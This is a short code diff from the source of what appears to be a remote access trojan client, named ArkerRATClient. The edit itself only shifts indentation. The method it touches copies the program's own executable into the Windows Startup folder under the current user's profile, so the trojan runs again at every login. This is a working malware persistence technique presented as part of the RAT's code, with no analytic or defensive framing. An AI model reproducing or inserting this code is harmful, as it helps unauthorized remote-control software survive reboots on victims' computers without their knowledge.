@@ -43,7 +43,8 @@ namespace ArkerRATClient
         {
             Task.Run(() =>
             {
-                byte[] arkerRatFileBytes = File.ReadAllBytes(Directory.GetCurrentDirectory() + @"\" + AppDomain.CurrentDomain.FriendlyName);
+            byte[] arkerRatFileBytes = File.ReadAllBytes(Directory.GetCurrentDirectory() + @"\" + AppDomain.CurrentDomain.FriendlyName);
+                
                 File.WriteAllBytes("C:\\Users\\"+Environment.UserName+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"+ AppDomain.CurrentDomain.FriendlyName, arkerRatFileBytes);
             });
         }
